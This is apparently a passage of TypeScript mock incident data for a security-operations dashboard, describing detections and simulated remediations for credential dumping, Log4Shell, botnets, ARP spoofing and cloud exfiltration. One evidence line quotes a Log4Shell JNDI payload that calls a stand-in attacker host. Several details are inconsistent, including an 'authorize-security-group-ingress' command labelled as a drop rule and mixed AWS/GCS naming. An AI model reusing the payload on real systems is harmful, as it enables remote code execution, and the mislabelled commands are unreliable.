          summary: 'Sysmon telemetry captured rogue process mimikatz_probe.exe opening a handle with PROCESS_VM_READ permissions against lsass.exe.',
          probable_root_cause: 'Adversary memory dumping tool attempting to harvest plain-text credentials and NTLM password hashes from LSA subsystem memory.',
          evidence: [
            'Sysmon Event 10: Source PID 7420 (mimikatz_probe.exe) called OpenProcess on target PID 680 (lsass.exe).',
            'Requested access mask 0x1010 (PROCESS_VM_READ | PROCESS_QUERY_INFORMATION).',
            'Host CPU elevated to 58.0% during memory mapping operation.',
          ],
          confidence: 0.964,
          alternative_hypotheses: [
            'Legitimate system diagnostic utility or debugger attached by system administrator',
            'Enterprise endpoint security agent (EDR) conducting deep memory integrity inspection',
          ],
          uncertainty_note: 'Verified from Windows Sysmon Event ID 10 process access telemetry.',
        },
        recommended_actions: [
          {
            action_id: 'ACT_TERMINATE_EXPLOIT_PID',
            name: 'Terminate Injector Process & Purge Kerberos Tickets',
            description: 'Forcefully kill non-system process PID 7420, purge active Kerberos tickets via klist purge, and enable LSA Protection',
            scope: 'PHYSICAL-LAPTOP-04 (PID: 7420)',
            risk_level: 'high',
            reversible: false,
            rollback_steps: 'Restart application if identified as false positive; user re-authenticates to get fresh Kerberos tickets',
            expected_outcome: 'Memory handle closed; plaintext credential extraction and ticket reuse prevented',
          },
        ],
        approval: {
          decided_by: 'SOC Operator',
          decision: 'approved',
          decided_at: new Date(Date.now() - 1000 * 60 * 118).toISOString(),
          comment: 'Confirmed malicious lsass memory access. Authorized taskkill & ticket purge.',
        },
        execution_log: [
          {
            action_id: 'ACT_TERMINATE_EXPLOIT_PID',
            command: 'taskkill /F /PID 7420 && klist purge',
            dry_run: true,
            status: 'simulated',
            result: 'Exploit PID terminated in 680ms; Kerberos tickets invalidated.',
            duration_ms: 680,
            executed_at: new Date(Date.now() - 1000 * 60 * 118).toISOString(),
          },
        ],
        verification_result: {
          verified: true,
          probe: 'Memory Handle & EDR Watchdog',
          metrics_before: { suspicious_handles: 1 },
          metrics_after: { suspicious_handles: 0 },
          message: 'Injector handle closed. No credential hashes compromised.',
        },
        outcome_summary: 'Approved by SOC Operator. Threat isolated and validated.',
        created_at: new Date(Date.now() - 1000 * 60 * 120).toISOString(),
        updated_at: new Date().toISOString(),
      },
      {
        id: 'inc-ds-044',
        incident_id: 'inc-ds-044',
        title: 'SSH & Telnet Dictionary Brute Force (CIC-IDS2017 Replay)',
        severity: 'high',
        status: 'recorded',
        source: 'dataset_replay',
        tier1_family: 'brute_force',
        tier1_confidence: 0.992,
        tier2_technique: 'T1110 (Brute Force - Patator)',
        tier2_confidence: 0.985,
        target_asset: 'DATASET-WORKSTATION-44 (Historical Benchmark)',
        description: 'Replayed from CIC-IDS2017 dataset: high-frequency credential dictionary assault against port 22.',
        features: {
          cpu: 32.0,
          ram: 48.0,
          failed_logins: 110,
          inbound_traffic: 240.0,
          active_connections: 58,
          deviations: {
            failed_logins: { measured: 110, baseline: 0.0, multiplier: 110.0, ratio_str: '110 (baseline: 0)' },
            active_connections: { measured: 58, baseline: 25.0, multiplier: 2.3, ratio_str: '2.3x baseline' },
            inbound_traffic: { measured: 240.0, baseline: 120.0, multiplier: 2.0, ratio_str: '2.0x baseline' },
            cpu: { measured: 32.0, baseline: 15.0, multiplier: 2.1, ratio_str: '2.1x baseline' },
            ram: { measured: 48.0, baseline: 45.0, multiplier: 1.1, ratio_str: '1.1x baseline' },
          },
        },
        approval: {
          decided_by: 'Dataset Ingest Pipeline',
          decision: 'archived',
          decided_at: new Date(Date.now() - 1000 * 60 * 240).toISOString(),
          comment: 'Permanent dataset replay record. Never executes autonomously.',
        },
        execution_log: [],
        verification_result: null,
        outcome_summary: 'Permanent dataset record for offline compliance and model validation.',
        created_at: new Date(Date.now() - 1000 * 60 * 240).toISOString(),
        updated_at: new Date().toISOString(),
      },
      {
        id: 'inc-ds-001',
        incident_id: 'inc-ds-001',
        title: 'TCP SYN Flood Volumetric Assault (CSE-CIC-IDS2018 Replay)',
        severity: 'critical',
        status: 'recorded',
        source: 'dataset_replay',
        tier1_family: 'ddos',
        tier1_confidence: 0.998,
        tier2_technique: 'T1498 (Network Denial of Service)',
        tier2_confidence: 0.990,
        target_asset: 'DATASET-WORKSTATION-01 (Historical Benchmark)',
        description: 'Replayed from CSE-CIC-IDS2018 dataset: 125,000 pps volumetric flood saturating ingress interface.',
        features: {
          cpu: 88.0,
          ram: 72.0,
          failed_logins: 0,
          inbound_traffic: 125000.0,
          active_connections: 520,
          deviations: {
            inbound_traffic: { measured: 125000.0, baseline: 120.0, multiplier: 1041.6, ratio_str: '1041.6x baseline' },
            active_connections: { measured: 520, baseline: 25.0, multiplier: 20.8, ratio_str: '20.8x baseline' },
            cpu: { measured: 88.0, baseline: 15.0, multiplier: 5.9, ratio_str: '5.9x baseline' },
            ram: { measured: 72.0, baseline: 45.0, multiplier: 1.6, ratio_str: '1.6x baseline' },
            failed_logins: { measured: 0, baseline: 0.0, multiplier: 1.0, ratio_str: '0 (baseline: 0)' },
          },
        },
        approval: {
          decided_by: 'Dataset Ingest Pipeline',
          decision: 'archived',
          decided_at: new Date(Date.now() - 1000 * 60 * 300).toISOString(),
          comment: 'Permanent dataset replay record. Never executes autonomously.',
        },
        execution_log: [],
        verification_result: null,
        outcome_summary: 'Permanent dataset record for offline compliance and model validation.',
        created_at: new Date(Date.now() - 1000 * 60 * 300).toISOString(),
        updated_at: new Date().toISOString(),
      },
      {
        id: 'inc-ds-088',
        incident_id: 'inc-ds-088',
        title: 'SQL Injection Attack (CIC-IDS2017 Web Replay)',
        severity: 'high',
        status: 'recorded',
        source: 'dataset_replay',
        tier1_family: 'web_attack',
        tier1_confidence: 0.978,
        tier2_technique: 'T1190 (Exploit Public-Facing Application)',
        tier2_confidence: 0.965,
        target_asset: 'DATASET-WORKSTATION-88 (Web Application Server)',
        description: 'Replayed from CIC-IDS2017: SQL injection payload injected into query parameters to dump credentials.',
        features: {
          cpu: 28.0,
          ram: 45.0,
          failed_logins: 0,
          inbound_traffic: 680.0,
          active_connections: 62,
          deviations: {
            inbound_traffic: { measured: 680.0, baseline: 120.0, multiplier: 5.7, ratio_str: '5.7x baseline' },
            active_connections: { measured: 62, baseline: 25.0, multiplier: 2.5, ratio_str: '2.5x baseline' },
            cpu: { measured: 28.0, baseline: 15.0, multiplier: 1.9, ratio_str: '1.9x baseline' },
            ram: { measured: 45.0, baseline: 45.0, multiplier: 1.0, ratio_str: '1.0x baseline' },
            failed_logins: { measured: 0, baseline: 0.0, multiplier: 1.0, ratio_str: '0 (baseline: 0)' },
          },
        },
        rca: {
          summary: 'Telemetry indicates SQL injection targeting database tier via unvalidated web parameter inputs.',
          probable_root_cause: 'Unsanitized user inputs in web application parameters vulnerable to SQL injection.',
          evidence: [
            'WAF signature match: evaluatePreconfiguredExpr(sqli-v33-stable) triggered.',
            'active_connections elevated to 62 targeting application database endpoints.',
          ],
          confidence: 0.978,
          alternative_hypotheses: ['Authorized dynamic application security testing (DAST) scanner'],
          uncertainty_note: 'Probabilistic classification from CIC-IDS2017 benchmark dataset.',
        },
        recommended_actions: [
          {
            action_id: 'ACT_WAF_INJECT_RULE',
            name: 'Deploy Web Application Firewall Rule',
            description: 'Inject AWS WAF SQLi filter rule and block client IP session',
            scope: 'DATASET-WORKSTATION-88 (Web Ingress)',
            risk_level: 'low',
            reversible: true,
            rollback_steps: 'Remove WAF signature rule from reverse proxy',
            expected_outcome: 'Immediate neutralization of SQL injection payload without downtime',
          },
        ],
        approval: {
          decided_by: 'Dataset Ingest Pipeline',
          decision: 'archived',
          decided_at: new Date(Date.now() - 1000 * 60 * 360).toISOString(),
          comment: 'Permanent dataset replay record. Never executes autonomously.',
        },
        execution_log: [],
        verification_result: null,
        outcome_summary: 'Dataset replay record for offline compliance and model validation.',
        created_at: new Date(Date.now() - 1000 * 60 * 360).toISOString(),
        updated_at: new Date().toISOString(),
      },
      {
        id: 'inc-ds-111',
        incident_id: 'inc-ds-111',
        title: 'Log4Shell JNDI RCE Exploit (CVE-2021-44228 Replay)',
        severity: 'critical',
        status: 'recorded',
        source: 'dataset_replay',
        tier1_family: 'web_attack',
        tier1_confidence: 0.995,
        tier2_technique: 'T1190 (Exploit Public-Facing Application)',
        tier2_confidence: 0.992,
        target_asset: 'DATASET-WORKSTATION-111 (Java Microservice)',
        description: 'Replayed from CVE-2021-44228 telemetry: JNDI LDAP lookup string embedded in HTTP User-Agent.',
        features: {
          cpu: 45.0,
          ram: 68.0,
          failed_logins: 0,
          inbound_traffic: 540.0,
          active_connections: 48,
          deviations: {
            inbound_traffic: { measured: 540.0, baseline: 120.0, multiplier: 4.5, ratio_str: '4.5x baseline' },
            cpu: { measured: 45.0, baseline: 15.0, multiplier: 3.0, ratio_str: '3.0x baseline' },
            ram: { measured: 68.0, baseline: 45.0, multiplier: 1.5, ratio_str: '1.5x baseline' },
            active_connections: { measured: 48, baseline: 25.0, multiplier: 1.9, ratio_str: '1.9x baseline' },
            failed_logins: { measured: 0, baseline: 0.0, multiplier: 1.0, ratio_str: '0 (baseline: 0)' },
          },
        },
        rca: {
          summary: 'Inbound HTTP request contained Log4Shell JNDI exploit payload attempting out-of-band LDAP callback.',
          probable_root_cause: 'Vulnerable Log4j 2.x dependency parsing unescaped string patterns.',
          evidence: [
            'Payload pattern detected: ${jndi:ldap://attacker.com/exploit} in HTTP User-Agent.',
            'Attempted outbound LDAP connection over port 1389.',
          ],
          confidence: 0.995,
          alternative_hypotheses: ['Authorized internal penetration test'],
          uncertainty_note: 'Verified CVE-2021-44228 signature in dataset taxonomy.',
        },
        recommended_actions: [
          {
            action_id: 'ACT_WAF_INJECT_RULE',
            name: 'AWS WAF Log4Shell Mitigation Rule',
            description: 'Deploy AWS WAF preconfigured WAF rule cve-can-2021-44228 and block outbound LDAP/RMI',
            scope: 'DATASET-WORKSTATION-111 (Application Gateway)',
            risk_level: 'high',
            reversible: true,
            rollback_steps: 'Remove WAF rule and restore logging flags',
            expected_outcome: 'JNDI injection blocked at edge; vulnerable logger never invoked',
          },
        ],
        approval: {
          decided_by: 'Dataset Ingest Pipeline',
          decision: 'archived',
          decided_at: new Date(Date.now() - 1000 * 60 * 400).toISOString(),
          comment: 'Permanent dataset replay record. Never executes autonomously.',
        },
        execution_log: [],
        verification_result: null,
        outcome_summary: 'Dataset replay record for offline compliance and model validation.',
        created_at: new Date(Date.now() - 1000 * 60 * 400).toISOString(),
        updated_at: new Date().toISOString(),
      },
      {
        id: 'inc-ds-126',
        incident_id: 'inc-ds-126',
        title: 'Mirai IoT Botnet C2 & IRC Beaconing (BoT-IoT Replay)',
        severity: 'high',
        status: 'recorded',
        source: 'dataset_replay',
        tier1_family: 'botnet',
        tier1_confidence: 0.984,
        tier2_technique: 'T1071 (Application Layer Protocol - C2)',
        tier2_confidence: 0.975,
        target_asset: 'DATASET-WORKSTATION-126 (Edge Gateway)',
        description: 'Replayed from BoT-IoT dataset: Mirai botnet implant communicating with C2 IRC server.',
        features: {
          cpu: 52.0,
          ram: 58.0,
          failed_logins: 0,
          inbound_traffic: 310.0,
          active_connections: 76,
          deviations: {
            active_connections: { measured: 76, baseline: 25.0, multiplier: 3.0, ratio_str: '3.0x baseline' },
            cpu: { measured: 52.0, baseline: 15.0, multiplier: 3.5, ratio_str: '3.5x baseline' },
            inbound_traffic: { measured: 310.0, baseline: 120.0, multiplier: 2.6, ratio_str: '2.6x baseline' },
            ram: { measured: 58.0, baseline: 45.0, multiplier: 1.3, ratio_str: '1.3x baseline' },
            failed_logins: { measured: 0, baseline: 0.0, multiplier: 1.0, ratio_str: '0 (baseline: 0)' },
          },
        },
        rca: {
          summary: 'Host exhibits periodic outbound beaconing and background process activity matching Mirai botnet C2.',
          probable_root_cause: 'Telnet scanner spread rogue botnet binary into /tmp directory.',
          evidence: [
            'Outbound connection established to IRC C2 server on port 6667.',
            'Background daemon thread running from /tmp/mirai.',
          ],
          confidence: 0.984,
          alternative_hypotheses: ['Legitimate IRC client or chat bridge running on host'],
          uncertainty_note: 'Probabilistic classification from BoT-IoT benchmark dataset.',
        },
        recommended_actions: [
          {
            action_id: 'ACT_KILL_MINING_PROCESS',
            name: 'Terminate Botnet PID & Quarantine Binary',
            description: 'Kill rogue bot process, isolate binary in /opt/quarantine, and drop port 6667 egress',
            scope: 'DATASET-WORKSTATION-126',
            risk_level: 'medium',
            reversible: false,
            rollback_steps: 'Restore binary from quarantine if identified as false positive',
            expected_outcome: 'C2 communication severed and malicious binary quarantined',
          },
        ],
        approval: {
          decided_by: 'Dataset Ingest Pipeline',
          decision: 'archived',
          decided_at: new Date(Date.now() - 1000 * 60 * 450).toISOString(),
          comment: 'Permanent dataset replay record. Never executes autonomously.',
        },
        execution_log: [],
        verification_result: null,
        outcome_summary: 'Dataset replay record for offline compliance and model validation.',
        created_at: new Date(Date.now() - 1000 * 60 * 450).toISOString(),
        updated_at: new Date().toISOString(),
      },
      {
        id: 'inc-ds-145',
        incident_id: 'inc-ds-145',
        title: 'ARP Cache Poisoning & Man-in-the-Middle (CIC-IDS2017 Replay)',
        severity: 'high',
        status: 'recorded',
        source: 'dataset_replay',
        tier1_family: 'infiltration',
        tier1_confidence: 0.962,
        tier2_technique: 'T1557.002 (ARP Poisoning)',
        tier2_confidence: 0.950,
        target_asset: 'DATASET-WORKSTATION-145 (LAN Switch Segment)',
        description: 'Replayed from CIC-IDS2017: gratuitous ARP replies associating gateway IP with attacker MAC address.',
        features: {
          cpu: 24.0,
          ram: 46.0,
          failed_logins: 0,
          inbound_traffic: 890.0,
          active_connections: 54,
          deviations: {
            inbound_traffic: { measured: 890.0, baseline: 120.0, multiplier: 7.4, ratio_str: '7.4x baseline' },
            active_connections: { measured: 54, baseline: 25.0, multiplier: 2.2, ratio_str: '2.2x baseline' },
            cpu: { measured: 24.0, baseline: 15.0, multiplier: 1.6, ratio_str: '1.6x baseline' },
            ram: { measured: 46.0, baseline: 45.0, multiplier: 1.0, ratio_str: '1.0x baseline' },
            failed_logins: { measured: 0, baseline: 0.0, multiplier: 1.0, ratio_str: '0 (baseline: 0)' },
          },
        },
        rca: {
          summary: 'Inbound ARP traffic surge contains conflicting IP-to-MAC associations targeting the default gateway.',
          probable_root_cause: 'Adversary sending forged gratuitous ARP replies to intercept LAN traffic.',
          evidence: [
            'ARP table anomaly: Gateway IP associated with multiple conflicting MAC addresses.',
            'Unsolicited ARP reply burst rate reached 42 pkts/sec.',
          ],
          confidence: 0.962,
          alternative_hypotheses: ['Network card NIC teaming or VRRP/HSRP router failover'],
          uncertainty_note: 'Probabilistic classification from CIC-IDS2017 benchmark dataset.',
        },
        recommended_actions: [
          {
            action_id: 'ACT_ISOLATE_NETWORK_INTERFACE',
            name: 'Isolate Rogue Network Interface & Flush ARP Cache',
            description: 'Flush local ARP cache, enable Dynamic ARP Inspection (DAI), and disable rogue virtual port',
            scope: 'DATASET-WORKSTATION-145',
            risk_level: 'medium',
            reversible: true,
            rollback_steps: 'Re-enable network interface and restore baseline static ARP bindings',
            expected_outcome: 'Interception severed; network cache integrity restored',
          },
        ],
        approval: {
          decided_by: 'Dataset Ingest Pipeline',
          decision: 'archived',
          decided_at: new Date(Date.now() - 1000 * 60 * 500).toISOString(),
          comment: 'Permanent dataset replay record. Never executes autonomously.',
        },
        execution_log: [],
        verification_result: null,
        outcome_summary: 'Dataset replay record for offline compliance and model validation.',
        created_at: new Date(Date.now() - 1000 * 60 * 500).toISOString(),
        updated_at: new Date().toISOString(),
      },
      {
        id: 'inc-ds-163',
        incident_id: 'inc-ds-163',
        title: 'Public Cloud Storage Bucket Exposure (Cloud Control Plane)',
        severity: 'critical',
        status: 'recorded',
        source: 'dataset_replay',
        tier1_family: 'cloud_storage',
        tier1_confidence: 0.988,
        tier2_technique: 'T1530 (Data from Cloud Storage Object)',
        tier2_confidence: 0.980,
        target_asset: 's3://adaptive-customer-records (Cloud Storage)',
        description: 'Replayed from Cloud Audit Logs: bucket ACL changed to allUsers read, triggering rapid object downloads.',
        features: {
          cpu: 18.0,
          ram: 45.0,
          failed_logins: 0,
          inbound_traffic: 3200.0,
          active_connections: 84,
          deviations: {
            inbound_traffic: { measured: 3200.0, baseline: 120.0, multiplier: 26.7, ratio_str: '26.7x baseline' },
            active_connections: { measured: 84, baseline: 25.0, multiplier: 3.4, ratio_str: '3.4x baseline' },
            cpu: { measured: 18.0, baseline: 15.0, multiplier: 1.2, ratio_str: '1.2x baseline' },
            ram: { measured: 45.0, baseline: 45.0, multiplier: 1.0, ratio_str: '1.0x baseline' },
            failed_logins: { measured: 0, baseline: 0.0, multiplier: 1.0, ratio_str: '0 (baseline: 0)' },
          },
        },
        rca: {
          summary: 'Audit telemetry shows bucket permissions modified to public read, resulting in external mass download.',
          probable_root_cause: 'Storage bucket permissions inadvertently changed to allUsers / public read.',
          evidence: [
            'AWS CloudTrail Log: SetBucketIamPolicy with allUsers member binding.',
            'Outbound egress spike reaching 3,200 requests/sec from unknown external IP ranges.',
          ],
          confidence: 0.988,
          alternative_hypotheses: ['Authorized public asset distribution or CDN origin configuration'],
          uncertainty_note: 'Verified from Cloud Control Plane audit taxonomy.',
        },
        recommended_actions: [
          {
            action_id: 'ACT_FREEZE_BUCKET_EGRESS',
            name: 'Enforce Uniform Bucket Access & Freeze Egress',
            description: 'Enable Uniform Bucket-Level Access and temporarily halt public egress transfers',
            scope: 's3://adaptive-customer-records',
            risk_level: 'high',
            reversible: true,
            rollback_steps: 'Restore previous bucket ACLs and remove transfer freeze',
            expected_outcome: 'Immediate cessation of data exfiltration while data integrity remains intact',
          },
        ],
        approval: {
          decided_by: 'Dataset Ingest Pipeline',
          decision: 'archived',
          decided_at: new Date(Date.now() - 1000 * 60 * 550).toISOString(),
          comment: 'Permanent dataset replay record. Never executes autonomously.',
        },
        execution_log: [],
        verification_result: null,
        outcome_summary: 'Dataset replay record for offline compliance and model validation.',
        created_at: new Date(Date.now() - 1000 * 60 * 550).toISOString(),
        updated_at: new Date().toISOString(),
      },
      {
        id: 'inc-ds-209',
        incident_id: 'inc-ds-209',
        title: 'Mimikatz LSASS Credential Dump (Mordor Security Dataset)',
        severity: 'critical',
        status: 'recorded',
        source: 'dataset_replay',
        tier1_family: 'host_windows',
        tier1_confidence: 0.994,
        tier2_technique: 'T1003.001 (OS Credential Dumping)',
        tier2_confidence: 0.990,
        target_asset: 'DATASET-WORKSTATION-209 (Windows Enterprise Host)',
        description: 'Replayed from Mordor dataset: unauthorized OpenProcess with PROCESS_VM_READ against lsass.exe.',
        features: {
          cpu: 64.0,
          ram: 70.0,
          failed_logins: 0,
          inbound_traffic: 130.0,
          active_connections: 28,
          deviations: {
            cpu: { measured: 64.0, baseline: 15.0, multiplier: 4.3, ratio_str: '4.3x baseline' },
            ram: { measured: 70.0, baseline: 45.0, multiplier: 1.6, ratio_str: '1.6x baseline' },
            active_connections: { measured: 28, baseline: 25.0, multiplier: 1.1, ratio_str: '1.1x baseline' },
            inbound_traffic: { measured: 130.0, baseline: 120.0, multiplier: 1.1, ratio_str: '1.1x baseline' },
            failed_logins: { measured: 0, baseline: 0.0, multiplier: 1.0, ratio_str: '0 (baseline: 0)' },
          },
        },
        rca: {
          summary: 'Host event telemetry captured process attempting memory handle acquisition against lsass.exe.',
          probable_root_cause: 'Calling OpenProcess with PROCESS_VM_READ against lsass.exe to dump Windows credentials.',
          evidence: [
            'Sysmon Event 10: Source PID 6810 requested DesiredAccess 0x1010 (PROCESS_VM_READ) on lsass.exe.',
            'Host CPU elevated during memory mapping operation.',
          ],
          confidence: 0.994,
          alternative_hypotheses: ['Legitimate diagnostic tool or anti-malware engine memory scan'],
          uncertainty_note: 'Verified from OTRF Mordor Security Datasets.',
        },
        recommended_actions: [
          {
            action_id: 'ACT_TERMINATE_EXPLOIT_PID',
            name: 'Terminate Exploit Process & Purge Session Tokens',
            description: 'Forcefully terminate non-system injector PID, purge Kerberos tickets, and enable LSA Protection',
            scope: 'DATASET-WORKSTATION-209',
            risk_level: 'high',
            reversible: false,
            rollback_steps: 'Manually restart application if identified as false positive',
            expected_outcome: 'Prevents extraction of plaintext passwords and NTLM password hashes',
          },
        ],
        approval: {
          decided_by: 'Dataset Ingest Pipeline',
          decision: 'archived',
          decided_at: new Date(Date.now() - 1000 * 60 * 600).toISOString(),
          comment: 'Permanent dataset replay record. Never executes autonomously.',
        },
        execution_log: [],
        verification_result: null,
        outcome_summary: 'Dataset replay record for offline compliance and model validation.',
        created_at: new Date(Date.now() - 1000 * 60 * 600).toISOString(),
        updated_at: new Date().toISOString(),
      },
      {
        id: 'inc-007',
        incident_id: 'inc-007',
        title: 'Mass GCS Storage Bucket Data Egress Exfiltration',
        severity: 'critical',
        status: 'verified',
        source: 'live',
        tier1_family: 'cloud_storage',
        tier1_confidence: 0.978,
        tier2_technique: 'T1537 (Transfer Data to Cloud Account)',
        tier2_confidence: 0.965,
        target_asset: 's3://adaptive-secure-backups (Amazon S3)',
        description: 'Compromised API key streaming 42.4 GB of database backup objects to unauthorized external ASN at 180 MB/s.',
        features: {
          cpu: 24.0,
          ram: 48.0,
          failed_logins: 0,
          inbound_traffic: 4500.0,
          active_connections: 92,
          deviations: {
            inbound_traffic: { measured: 4500.0, baseline: 120.0, multiplier: 37.5, ratio_str: '37.5x baseline' },
            active_connections: { measured: 92, baseline: 25.0, multiplier: 3.7, ratio_str: '3.7x baseline' },
            cpu: { measured: 24.0, baseline: 15.0, multiplier: 1.6, ratio_str: '1.6x baseline' },
            ram: { measured: 48.0, baseline: 45.0, multiplier: 1.1, ratio_str: '1.1x baseline' },
            failed_logins: { measured: 0, baseline: 0.0, multiplier: 1.0, ratio_str: '0 (baseline: 0)' },
          },
        },
        rca: {
          summary: 'Abnormal data download burst detected on storage bucket s3://adaptive-secure-backups departing sharply from baseline (353x daily volume).',
          probable_root_cause: 'Compromised storage access token or leaked pre-signed URL attempting bulk data exfiltration.',
          evidence: [
            'Egress bandwidth reached 180 MB/s transferring encrypted database snapshots.',
            'Target bucket: s3://adaptive-secure-backups accessed from foreign ASN 100.64.0.15.',
          ],
          confidence: 0.978,
          alternative_hypotheses: [
            'Authorized secondary disaster recovery regional backup replication',
            'BigQuery data warehouse loading training data partitions',
          ],
          uncertainty_note: 'Verified from Amazon S3 Access Logs and VPC Flow egress probes.',
        },
        recommended_actions: [
          {
            action_id: 'ACT_FREEZE_BUCKET_EGRESS',
            name: 'Enforce Uniform Bucket Access & Freeze Egress',
            description: 'Enforce Uniform Bucket-Level Access on s3://adaptive-secure-backups and halt external downloads',
            scope: 's3://adaptive-secure-backups (GCS)',
            risk_level: 'high',
            reversible: true,
            rollback_steps: 'Restore prior bucket ACL configuration and re-enable public egress',
            expected_outcome: 'Immediate cessation of data exfiltration; egress dropped from 180 MB/s to 0 MB/s',
          },
        ],
        approval: {
          decided_by: 'Cloud SecOps Operator',
          decision: 'approved',
          decided_at: new Date(Date.now() - 1000 * 60 * 179).toISOString(),
          comment: 'Confirmed unauthorized storage exfiltration. Authorized immediate GCS bucket lockdown.',
        },
        execution_log: [
          {
            action_id: 'ACT_FREEZE_BUCKET_EGRESS',
            command: 'aws s3api put-public-access-block --bucket adaptive-secure-backups --public-access-block-configuration BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true',
            dry_run: true,
            status: 'simulated',
            result: 'Uniform bucket access enforced in 510ms',
            duration_ms: 510,
            executed_at: new Date(Date.now() - 1000 * 60 * 179).toISOString(),
          },
        ],
        verification_result: {
          verified: true,
          probe: 'Cloud Storage Egress Telemetry Probe',
          metrics_before: { egress_rate_mbps: 180 },
          metrics_after: { egress_rate_mbps: 0 },
          message: 'Public downloads rejected with HTTP 403; bucket locked down.',
        },
        outcome_summary: 'Approved by Cloud SecOps Operator. Data exfiltration halted in 510ms.',
        created_at: new Date(Date.now() - 1000 * 60 * 180).toISOString(),
        updated_at: new Date().toISOString(),
      },
      {
        id: 'inc-008',
        incident_id: 'inc-008',
        title: 'Network Infiltration & Rogue Gateway ARP Spoofing',
        severity: 'high',
        status: 'awaiting_approval',
        source: 'simulated',
        tier1_family: 'infiltration',
        tier1_confidence: 0.955,
        tier2_technique: 'T1557.002 (ARP Poisoning)',
        tier2_confidence: 0.940,
        target_asset: 'PHYSICAL-LAPTOP-02 (Lab Network Segment)',
        description: 'Unsolicited gratuitous ARP reply stream attempting to redirect default gateway traffic through rogue host 192.168.1.108.',
        features: {
          cpu: 26.0,
          ram: 48.0,
          failed_logins: 0,
          inbound_traffic: 780.0,
          active_connections: 52,
          deviations: {
            inbound_traffic: { measured: 780.0, baseline: 120.0, multiplier: 6.5, ratio_str: '6.5x baseline' },
            active_connections: { measured: 52, baseline: 25.0, multiplier: 2.1, ratio_str: '2.1x baseline' },
            cpu: { measured: 26.0, baseline: 15.0, multiplier: 1.7, ratio_str: '1.7x baseline' },
            ram: { measured: 48.0, baseline: 45.0, multiplier: 1.1, ratio_str: '1.1x baseline' },
            failed_logins: { measured: 0, baseline: 0.0, multiplier: 1.0, ratio_str: '0 (baseline: 0)' },
          },
        },
        rca: {
          summary: 'Local network adapter detected forged ARP broadcast packets asserting MAC AA:BB:CC:DD:EE:18 for IP 192.168.1.1 (Default Gateway).',
          probable_root_cause: 'Adversary tool executing Man-in-the-Middle ARP cache poisoning to intercept unencrypted LAN traffic.',
          evidence: [
            'ARP table conflict: Gateway 192.168.1.1 mapped to rogue MAC AA:BB:CC:DD:EE:18.',
            'Unsolicited ARP packet rate at 48 pkts/sec.',
          ],
          confidence: 0.955,
          alternative_hypotheses: [
            'Legitimate network router HSRP/VRRP gateway failover event',
            'Network interface card NIC teaming configuration update',
          ],
          uncertainty_note: 'Verified from host raw socket frame monitor and ARP cache inspection.',
        },
        recommended_actions: [
          {
            action_id: 'ACT_ISOLATE_NETWORK_INTERFACE',
            name: 'Isolate Rogue Network Interface & Flush ARP Cache',
            description: 'Flush poisoned host ARP table, drop forged frames, and isolate virtual adapter',
            scope: 'PHYSICAL-LAPTOP-02 (Local Adapter)',
            risk_level: 'medium',
            reversible: true,
            rollback_steps: 'Re-enable adapter and restore baseline static gateway ARP mapping',
            expected_outcome: 'Man-in-the-middle interception severed; authentic gateway route restored',
          },
        ],
        approval: {
          decided_by: null,
          decision: null,
          decided_at: null,
          comment: null,
        },
        execution_log: [],
        verification_result: null,
        outcome_summary: 'ARP poisoning detected. Human authorization requested to isolate interface.',
        created_at: new Date(Date.now() - 1000 * 60 * 12).toISOString(),
        updated_at: new Date().toISOString(),
      },
    ];
  }

  if (cleanUrl.includes('/rca')) {
    const incId = cleanUrl.split('/')[2] || 'inc-001';

    const rcaDatabase: Record<string, any> = {
      'inc-001': {
        id: 'rca-001',
        incident_id: 'inc-001',
        title: 'Volumetric TCP SYN Flood Attack on AWS VPC',
        mitre_technique: 'T1498.001 (Direct Network Flood)',
        target_asset: 'AWS-EC2-SOUTH-01 (AWS VPC Gateway)',
        probable_cause: 'Adversary botnet coordinated a distributed TCP SYN flood against AWS VPC ingress load balancers with 94,000 pps, attempting to saturate connection state tables.',
        confidence: 0.985,
        source_ips: [
          { ip: '198.51.100.45', count: 48200, country: 'External Botnet Node', city: 'Frankfurt, DE' },
          { ip: '203.0.113.88', count: 45800, country: 'External Botnet Node', city: 'Moscow, RU' },
        ],
        affected_hosts: ['AWS-EC2-SOUTH-01', 'aws-vpc-ingress-proxy'],
        evidence: {
          flow_pps: 94000,
          protocol: 'TCP SYN',
          baseline_pps: 450,
          anomalous_ratio: '208x baseline',
          cloud_sensor: 'AWS VPC Flow Logs',
        },
        timeline: [
          { ts: new Date(Date.now() - 1000 * 60 * 16).toISOString(), type: 'NETWORK_PROBE', description: 'SYN Scan probe detected on VPC edge', source: 'AWS VPC Flow Logs' },
          { ts: new Date(Date.now() - 1000 * 60 * 15).toISOString(), type: 'VOLUMETRIC_SPIKE', description: 'Inbound packet rate surged to 94,000 pps', source: 'Cloud Monitoring' },
          { ts: new Date(Date.now() - 1000 * 60 * 15).toISOString(), type: 'ML_CLASSIFICATION', description: 'XGBoost classified T1498.001 with 98.5% confidence', source: 'Adaptive Threat Engine' },
          { ts: new Date(Date.now() - 1000 * 60 * 15 + 380).toISOString(), type: 'SELF_HEALING_DISPATCH', description: 'Injected AWS WAF edge rate-limiting policy', source: 'Self-Healing Engine' },
          { ts: new Date(Date.now() - 1000 * 60 * 14).toISOString(), type: 'VERIFICATION_PASSED', description: 'Inbound traffic dropped to 110 pps; health check confirmed', source: 'Verification Watchdog' },
        ],
        self_healing: {
          playbook_id: 'PB_CLOUD_ARMOR_RATE_LIMIT',
          playbook_name: 'AWS AWS WAF Edge Rate-Limiting & VPC Ingress Null-Route',
          status: 'healed',
          duration_ms: 380,
          target_layer: 'aws_vpc',
          actions_dispatched: [
            {
              type: 'aws_waf_security_policy',
              command: 'aws wafv2 update-web-acl --name adaptivecloud-rate-limit --scope REGIONAL --default-action Block={}',
              result: 'Rule priority 1000 created and propagated across Google global edge in 380ms',
              status: 'verified',
            },
            {
              type: 'vpc_firewall_drop',
              command: 'aws ec2 authorize-security-group-ingress --group-id sg-028ebbd83cf143b23 --protocol tcp --port 80 --cidr 198.51.100.45/32',
              result: 'Firewall drop rule applied to VPC network default',
              status: 'verified',
            },
          ],
          verification_probe: {
            metrics_before: { inbound_pps: 94000, cpu_load: 82.4, connection_state_table: '98% exhausted' },
            metrics_after: { inbound_pps: 110, cpu_load: 14.2, connection_state_table: '2% nominal' },
            health_check_passed: true,
            verification_time_ms: 500,
          },
          rollback_available: true,
          executed_at: new Date(Date.now() - 1000 * 60 * 15).toISOString(),
        },
        recommended_actions: [
          'Enforce Cloud CDN caching at edge to absorb static traffic loads',
